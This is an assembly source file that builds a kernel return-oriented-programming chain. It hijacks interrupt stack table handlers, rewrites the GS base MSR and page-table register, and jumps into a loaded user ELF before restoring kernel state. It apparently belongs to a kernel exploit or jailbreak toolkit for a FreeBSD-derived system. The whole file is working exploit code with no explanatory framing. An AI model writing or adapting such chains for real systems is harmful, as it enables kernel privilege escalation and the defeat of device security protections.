use64

%include "structs.inc"

extern add_rsp_iret
extern doreti_iret
extern justreturn
extern justreturn_pop
extern wrmsr_ret
extern pcpu
extern mov_rax_cr3
extern mov_cr3_rax_mov_ds
extern nop_ret
extern pop_all_iret
extern push_pop_all_iret
extern rep_movsb_pop_rbp_ret
extern store_rax_rdi
extern uelf_cr3
extern uelf_entry
extern ist_errc
extern ist_noerrc
extern comparison_table

global _start

; memcpy dst, src, size
%macro memcpy 3
dq pop_all_iret
; set arguments
times iret_rdi db 0
dq (%1)
times iret_rsi-iret_rdi-8 db 0
dq (%2)
times iret_rcx-iret_rsi-8 db 0
dq (%3)
times iret_rip-iret_rcx-8 db 0
dq rep_movsb_pop_rbp_ret
dq 0x20
dq 2
dq %%stack_after
%%stack_after:
dq 0 ; last argument of iret, also popped into rbp
%endmacro

; pokew where, value
%macro pokew 2
dq pop_all_iret
; set argument
times iret_rdi db 0
dq (%1)
times iret_rsi-iret_rdi-8 db 0
dq %%stack_after
times iret_rcx-iret_rsi-8 db 0
dq 2
times iret_rip-iret_rcx-8 db 0
dq rep_movsb_pop_rbp_ret
dq 0x20
dq 2
dq %%stack_after
dq 0
%%stack_after:
dq (%2) ; data to be copied, also popped into rbp
%endmacro

; pokeq where, value
%macro pokeq 2
dq pop_all_iret
; Load the destination and value, then use the firmware-selected scalar store.
; The continuation slot supports both "ret" and "pop rbp; ret" epilogues.
times iret_rdi db 0
dq (%1)
times iret_rax-iret_rdi-8 db 0
dq (%2)
times iret_rip-iret_rax-8 db 0
dq store_rax_rdi ; mov [rdi], rax; [pop rbp;] ret
dq 0x20
dq 2
dq %%stack_after
dq 0
%%stack_after:
dq nop_ret ; executed by ret, or consumed as rbp by pop rbp; ret
%endmacro

; cmpb ptr1, ptr2, is_less, is_equal, is_greater
%macro cmpb 5
memcpy %%poke1+iret_rsi+9, (%1), 1
memcpy %%poke1+iret_rsi+8, (%2), 1
%%poke1:
memcpy %%poke2+iret_rsi+8, comparison_table, 1
%%poke2:
memcpy %%iret+24, %%jump_table, 8
dq doreti_iret
%%iret:
dq nop_ret
dq 0x20
dq 2
dq 0
dq 0
section .data.qword
align 256
%%jump_table:
dq (%3)
dq (%4)
dq (%5)
section .text
%endmacro

; cmpwbe ptr1, ptr2, is_less, is_equal, is_greater
%macro cmpwbe 5
cmpb (%1), (%2), (%3), %%next_check, (%5)
%%next_check:
cmpb (%1)+1, (%2)+1, (%3), (%4), (%5)
%endmacro

; cmpdbe ptr1, ptr2, is_less, is_equal, is_greater
%macro cmpdbe 5
cmpwbe (%1), (%2), (%3), %%next_check, (%5)
%%next_check:
cmpwbe (%1)+2, (%2)+2, (%3), (%4), (%5)
%endmacro

; cmpqbe ptr1, ptr2, is_less, is_equal, is_greater
%macro cmpqbe 5
cmpdbe (%1), (%2), (%3), %%next_check, (%5)
%%next_check:
cmpdbe (%1)+4, (%2)+4, (%3), (%4), (%5)
%endmacro

; cmpqibe ptr1, imm, is_less, is_equal, is_greater
%macro cmpqibe 5
cmpqbe (%1), %%value, (%3), (%4), (%5)
section .data.qword
%%value:
dq (%2)
section .text
%endmacro

_start:
dq add_rsp_iret
dq errc_iret_frame+40
dq add_rsp_iret
dq noerrc_iret_frame+40
dq add_rsp_iret
dq int3_iret_frame+40

align 16
errc_iret_errc:
dq 0
errc_iret_frame:
times iret_rip-8 db 0
dq justreturn
dq 0x20
dq 2
dq errc_justreturn+32
dq 0

dq 1
errc_justreturn:
times 4 dq 0
dq justreturn_pop
dq 0x20
dq 2
dq errc_wrmsr_gsbase+4
dq 0
dd 0
errc_wrmsr_gsbase:
dq pcpu
dd 0
dq 0xc0000101
dq pcpu
dq wrmsr_ret
dq 0x20
dq 2
dq errc_wrmsr_return
dq 0
errc_wrmsr_return:
dq doreti_iret
dq push_pop_all_iret
dq 0x20
dq 2
dq errc_regs_stash+iret_rip
dq 0

times 128 db 0
errc_regs_stash:
times iret_rip db 0
dq nop_ret
dq 0x20
dq 2
dq errc_entry
dq 0

errc_entry:
memcpy regs_for_exit, errc_regs_stash, iret_rip-8
memcpy regs_for_exit+iret_rip-8, errc_iret_frame-8, 48
memcpy justreturn_bak, errc_justreturn-8, 40
pokeq intno, 13
dq doreti_iret
dq nop_ret
dq 0x20
dq 2
dq main
dq 0
;.decrypt_rdi_ret:
;pokew regs_for_exit+iret_rdi+6, 0xffff
;dq doreti_iret
;dq nop_ret
;dq 0x20
;dq 2
;dq .copy_justreturn_and_iret
;dq 0
;.decrypt_rsi_ret:
;pokew regs_for_exit+iret_rsi+6, 0xffff
;.copy_justreturn_and_iret:
;memcpy regs_for_exit+iret_rdx, errc_justreturn+8, 8
;memcpy regs_for_exit+iret_rcx, errc_justreturn+16, 8
;memcpy regs_for_exit+iret_rax, errc_justreturn+24, 8
;dq doreti_iret
;dq pop_all_iret
;dq 0x20
;dq 2
;dq regs_for_exit
;dq 0

align 16
dq 0
noerrc_iret_frame:
times iret_rip db 0
dq justreturn
dq 0x20
dq 2
dq noerrc_justreturn+32
dq 0
noerrc_justreturn:
times 4 dq 0
dq justreturn_pop
dq 0x20
dq 2
dq noerrc_wrmsr_gsbase+4
dq 0
dd 0
noerrc_wrmsr_gsbase:
dq pcpu
dd 0
dq 0xc0000101
dq pcpu
dq wrmsr_ret
dq 0x20
dq 2
dq noerrc_wrmsr_return
dq 0
noerrc_wrmsr_return:
dq doreti_iret
dq push_pop_all_iret
dq 0x20
dq 2
dq noerrc_regs_stash+iret_rip
dq 0

times 128 db 0
noerrc_regs_stash:
times iret_rip db 0
dq nop_ret
dq 0x20
dq 2
dq noerrc_entry
dq 0

noerrc_entry:
memcpy regs_for_exit, noerrc_regs_stash, iret_rip
memcpy regs_for_exit+iret_rip, noerrc_iret_frame, 40
memcpy justreturn_bak, noerrc_justreturn-8, 40
pokeq intno, 1
dq doreti_iret
dq nop_ret
dq 0x20
dq 2
dq main
dq 0

align 16
dq 0
int3_iret_frame:
times iret_rip db 0
dq justreturn
dq 0x20
dq 2
dq int3_justreturn+32
dq 0
int3_justreturn:
times 4 dq 0
dq justreturn_pop
dq 0x20
dq 2
dq int3_wrmsr_gsbase+4
dq 0
dd 0
int3_wrmsr_gsbase:
dq pcpu
dd 0
dq 0xc0000101
dq pcpu
dq wrmsr_ret
dq 0x20
dq 2
dq int3_wrmsr_return
dq 0
int3_wrmsr_return:
dq doreti_iret
dq push_pop_all_iret
dq 0x20
dq 2
dq int3_regs_stash+iret_rip
dq 0

times 128 db 0
int3_regs_stash:
times iret_rip db 0
dq nop_ret
dq 0x20
dq 2
dq int3_entry
dq 0

int3_entry:
memcpy regs_for_exit, int3_regs_stash, iret_rip
memcpy regs_for_exit+iret_rip, int3_iret_frame, 40
memcpy justreturn_bak, int3_justreturn-8, 40
pokeq intno, 3
dq doreti_iret
dq nop_ret
dq 0x20
dq 2
dq main
dq 0

main:
pokeq ist_noerrc, ist_after_read_cr3
dq doreti_iret
dq mov_rax_cr3
dq 0x20
dq 0x102
dq 0
dq 0

align 16
dq 0
iret_frame_after_read_cr3:
times 5 dq 0
ist_after_read_cr3:
times iret_rip-(ist_after_read_cr3-iret_frame_after_read_cr3) db 0
dq push_pop_all_iret
dq 0x20
dq 2
dq regs_stash_for_read_cr3+iret_rip
dq 0

times 128 db 0
regs_stash_for_read_cr3:
times iret_rip db 0
dq nop_ret
dq 0x20
dq 2
dq after_read_cr3
dq 0

after_read_cr3:
memcpy restore_cr3, regs_stash_for_read_cr3+iret_rax, 8
memcpy rsi_for_userspace, regs_stash_for_read_cr3+iret_rax, 8
pokeq ist_noerrc, ist_after_write_cr3
dq justreturn_pop
dq 0
dq 0
dq uelf_cr3
dq mov_cr3_rax_mov_ds
dq 0x20
dq 0x102
dq 0
dq 0

align 16
dq 0
iret_frame_after_write_cr3:
times 5 dq 0
ist_after_write_cr3:
times iret_rip-(ist_after_write_cr3-iret_frame_after_write_cr3) db 0
dq nop_ret
dq 0x20
dq 2
dq prepare_for_userspace
dq 0

prepare_for_userspace:
pokeq ist_errc, ist_after_userspace
dq pop_all_iret
times iret_rdi db 0
dq regs_for_exit
times iret_rsi-iret_rdi-8 db 0
rsi_for_userspace:
dq 0
times iret_rdx-iret_rsi-8 db 0
dq uelf_cr3
times iret_rcx-iret_rdx-8 db 0
dq justreturn_bak
times iret_r8-iret_rcx-8 db 0
dq return_wrmsr_gsbase+4
times iret_r9-iret_r8-8 db 0
dq restore_cr3
times iret_rip-iret_r9-8 db 0
dq doreti_iret
dq 0x20
dq 2
dq .trampoline
dq 0
.trampoline:
dq uelf_entry
dq 0x43
dq 2
dq 0
dq 0x3b

align 16
errc_after_userspace:
times 6 dq 0
ist_after_userspace:
times iret_rip-(ist_after_userspace-errc_after_userspace) db 0
dq nop_ret
dq 0x20
dq 2
dq after_userspace
dq 0
after_userspace:
pokeq ist_errc, errc_iret_frame+40
pokeq ist_noerrc, ist_after_restore_cr3
dq justreturn_pop
dq 0
dq 0
restore_cr3:
dq 0
dq mov_cr3_rax_mov_ds
dq 0x20
dq 0x102
dq 0
dq 0

align 16
dq 0
iret_frame_after_restore_cr3:
times 5 dq 0
ist_after_restore_cr3:
times iret_rip-(ist_after_restore_cr3-iret_frame_after_restore_cr3) db 0
dq nop_ret
dq 0x20
dq 2
dq return_to_caller
dq 0

return_to_caller:
pokeq ist_noerrc, noerrc_iret_frame+40
dq doreti_iret
dq justreturn_pop
dq 0x20
dq 2
dq return_wrmsr_gsbase+4
dq 0
dd 0
return_wrmsr_gsbase:
dq pcpu
dd 0
dq 0xc0000101
dq pcpu
dq wrmsr_ret
dq 0x20
dq 2
dq .after_wrmsr
dq 0
.after_wrmsr:
memcpy return_wrmsr_gsbase+4, noerrc_wrmsr_gsbase+4, 24
dq pop_all_iret
regs_for_exit:
times iret_rip+40 db 0

intno:
dq 0

justreturn_bak:
times 5 dq 0
